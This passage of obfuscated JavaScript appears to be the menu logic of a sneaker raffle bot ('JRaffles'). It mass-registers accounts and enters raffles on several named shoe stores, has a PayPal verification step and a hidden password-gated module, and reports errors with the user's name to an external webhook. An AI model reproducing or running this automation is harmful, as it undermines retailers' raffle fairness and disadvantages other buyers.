                                for (var _0x1f97b6 = 0x0; _0x1f97b6 < _0x2411aa['length']; _0x1f97b6++) {
                                    _0x4c265f['url'] = _0x2411aa[_0x1f97b6], console['log'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Task\x20' + (_0x1f97b6 + 0x1) + ':\x20Getting\x20Session'), await _0x36d9a6(_0x1f97b6, 'ver', _0x4c265f, _0x11c2d1, _0x272c91), console['log'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Sleeping\x20for\x20' + _0x13b92f['verificationDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['verificationDelay']);
                                }
                                ;
                                return _0x4adaa1();
                            }
                        }
                    } else {
                        if (_0xc93d09[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                            var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction], _0x272c91 = await _0x265cea(), _0x39879c = await _0x563ba1();
                            return await _0x2c8d1f(_0x39879c, _0x272c91, _0x4c265f), await _0x19d76a(0x1388), _0x4adaa1();
                        } else {
                            if (_0xc93d09[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                                var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x272c91 = await _0x265cea(), _0x45d0b2 = await _0x563ba1();
                                    console['log']('Starting\x20' + _0x304ca1['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x1f97b6 = 0x0; _0x1f97b6 < _0x45d0b2['length']; _0x1f97b6++) {
                                        console['log'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Task\x20' + (_0x1f97b6 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x493838(_0x1f97b6, 'nor', _0x4c265f, _0x45d0b2, _0x272c91);
                                        } catch (_0x1badfb) {
                                            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Task\x20' + (_0x1f97b6 + 0x1) + ':\x20Task\x20failed\x20' + _0x1badfb));
                                        }
                                        console['log'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Sleeping\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
                                    }
                                    return _0x4adaa1();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x272c91 = await _0x265cea();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), linksRaw = await _0x549519(), _0x2411aa = linksRaw['split'](';'), console['log'](_0x2411aa['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x1f97b6 = 0x0; _0x1f97b6 < _0x2411aa['length']; _0x1f97b6++) {
                                            try {
                                                _0x4c265f['url'] = _0x2411aa[_0x1f97b6], console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x1f97b6 + 0x1) + ':\x20Getting\x20Session'), await _0x493838(_0x1f97b6, 'ver', _0x4c265f, null, _0x272c91), console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x13b92f['verificationDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['verificationDelay']);
                                            } catch (_0x6c7dca) {
                                                console['log'](_0x6c7dca), await _0x19d76a(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x4adaa1();
                                    }
                                }
                                ;
                            } else {
                                if (_0xc93d09[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                                    var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x535818('https://bouncewear.com/nl/account/register', _0x4c265f);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0xc93d09[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                                        var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x272c91 = await _0x265cea(), _0x1fb300 = await _0x563ba1();
                                            return await _0x3d389f('https://patta.nl/account/register', _0x4c265f, _0x1fb300, _0x272c91), _0x4adaa1();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x272c91 = await _0x265cea(), _0x1fb300 = await _0x563ba1();
                                                return await _0x4bcee3('', _0x4c265f, _0x1fb300, _0x272c91), _0x4adaa1();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0xc93d09[taskModule]['name'] == 'SLAMJAM') {
                                            taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                                            var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x272c91 = await _0x265cea(), _0x2f14b9 = await _0x563ba1();
                                                return await _0x428ef4('https://slamjam.nl/account/register', _0x4c265f, _0x2f14b9, _0x272c91), _0x4adaa1();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x272c91 = await _0x265cea(), _0x2f14b9 = await _0x563ba1();
                                                    return await _0x5c1081('', _0x4c265f, _0x2f14b9, _0x272c91), _0x4adaa1();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0xc93d09[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                                                var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x272c91 = await _0x265cea(), _0x40f2d3 = await _0x563ba1();
                                                    return await _0x2dd9c5('https://www.kickz.com/nl/login/', _0x4c265f, _0x40f2d3, _0x272c91), _0x4adaa1();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x272c91 = await _0x265cea(), _0x40f2d3 = await _0x563ba1();
                                                        return await _0x27a5fb(_0x4c265f, _0x40f2d3, _0x272c91), _0x4adaa1();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0xc93d09[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                                                    var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x272c91 = await _0x265cea(), _0x586ee5 = await _0x563ba1();
                                                        return await _0x2b3034(_0x4c265f, _0x586ee5, _0x272c91), _0x4adaa1();
                                                    }
                                                } else {
                                                    if (_0xc93d09[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x19d76a(0x3e8), _0x4adaa1();
                                                    else {
                                                        if (_0xc93d09[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x2c0fce = _0xc93d09[taskModule]['name'];
                                                            const _0x1212be = await _0x549519();
                                                            var _0x2411aa = _0x1212be['split'](';');
                                                            await _0x105b4a(_0x2411aa, _0x2c0fce);
                                                        } else {
                                                            if (_0xc93d09[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x7367c8 = 0x0;
                                                                for (const _0x815037 in _0x13b92f) {
                                                                    console['log']('(' + _0x7367c8 + ')\x20' + _0x815037 + '\x20:\x20' + _0x13b92f[_0x815037]), _0x7367c8++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x7367c8 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x4d14d3 = await _0x537b9b();
                                                                if (_0x4d14d3 == _0x7367c8)
                                                                    return _0x4adaa1();
                                                                console['clear'];
                                                                var _0x3dd2fe = 0x0;
                                                                for (var _0x4e82a0 in _0x13b92f) {
                                                                    if (_0x4d14d3 == _0x3dd2fe) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x4e82a0 + '\x20:'), _0x13b92f[_0x4e82a0] = await _0x2a8869(), _0x20c314['writeFileSync']('../settings.json', JSON['stringify'](_0x13b92f));
                                                                        break;
                                                                    } else
                                                                        _0x3dd2fe++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x19d76a(0xbb8), _0x4adaa1();
                                                            } else {
                                                                if (_0xc93d09[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x2eb434(), _0x4adaa1();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0xc93d09[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x1da4bb = await _0xa4d8c6();
                                                                        _0x1da4bb == 'ModuleVoorDeBoys' ? (await _0x12cd3d(), await _0x48b076(), await afewFunction(_0x102540[_0x52e005], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x19d76a(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x4adaa1();
        } catch (_0x345bac) {
            return console['log'](_0x345bac), await _0x19d76a(0x3a98);
        }
}
;
_0x4bc62a('JRaffles\x20' + _0x520c59), _0x2eb434();
try {
    _0x2983f1();
} catch (_0x3ad700) {
    var _0xd351fd = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x17ac6d
            },
            {
                'name': 'Version',
                'value': '' + _0x520c59
            },
            {
                'name': 'Error',
                'value': '' + _0x3ad700
            }
        ]
    }];
    const _0x507ff4 = { 'embeds': _0xd351fd };
    _0xdeed(_0x192865, _0x507ff4);
}